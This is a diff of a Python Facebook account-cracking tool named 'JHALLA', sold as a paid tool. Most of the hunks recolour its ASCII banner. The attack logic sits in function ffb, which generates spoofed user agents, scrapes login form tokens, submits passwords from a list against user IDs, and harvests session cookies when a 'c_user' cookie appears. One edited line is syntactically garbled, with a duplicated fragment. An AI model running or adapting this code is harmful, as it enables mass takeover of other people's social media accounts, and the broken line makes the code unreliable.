@@ -57,22 +57,22 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 logo=("""\033[1;37m
-\x1b[1;92m      ## ##     ##    ###    ##       ##          ###   
-\x1b[1;92m      ## ##     ##   ## ##   ##       ##         ## ##   
-\033[1;37m      ## ##     ##  ##   ##  ##       ##        ##   ##  
-\033[1;37m      ## ######### ##     ## ##       ##       ##     ## 
+\x1b[1;37m      ## ##     ##    ###    ##       ##          ###   
+\x1b[1;37m      ## ##     ##   ## ##   ##       ##         ## ##   
+\033[1;92m      ## ##     ##  ##   ##  ##       ##        ##   ##  
+\033[1;92m      ## ######### ##     ## ##       ##       ##     ## 
 \033[1;37m##    ## ##     ## ######### ##       ##       ######### 
-\x1b[1;92m##    ## ##     ## ##     ## ##       ##       ##     ## 
- \x1b[1;92m ######  ##     ## ##     ## ######## ######## ##     ## 
+\x1b[1;37m##    ## ##     ## ##     ## ##       ##       ##     ## 
+ \x1b[1;92m######  ##     ## ##     ## ######## ######## ##     ## 
 ----------------------------------------------
-  AUTHOR  :ABU BAKAR
+ AUTHOR  :ABU BAKAR
  Tool Name :JHALLA
  Type type : PAID 
-  \x1b[1;92mVersion   : 1.2
+ \x1b[1;92mVersion   : 1.2
 ----------------------------------------------
-\x1b[1;92mversion 1.2  
+\x1b[1;37mJHALLA ALONE TOPPER
  
-\033[1;37m------NOTE---100089 100088 FILE COOLING WORKING-------------------------------------""")
+\033[1;92m------LOKI MENU JHALLKHANDNYNY-------------------------")
 def linex():
         print('\033[1;37m----------------------------------------------')
 def clear():
@@ -488,7 +488,7 @@ def ffb(ids,names,passlist):
 }
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post('https://free.facebook.com/', cookies=cookies, headers=headers)
+                        complete = session.post('https://m.facebook.com/', cookies=cookies, headers=headers)com/', cookies=cookies, headers=headers)
                         SILENT=session.cookies.get_dict().keys()
                         if "c_user" in SILENT:
                                 coki=session.cookies.get_dict()
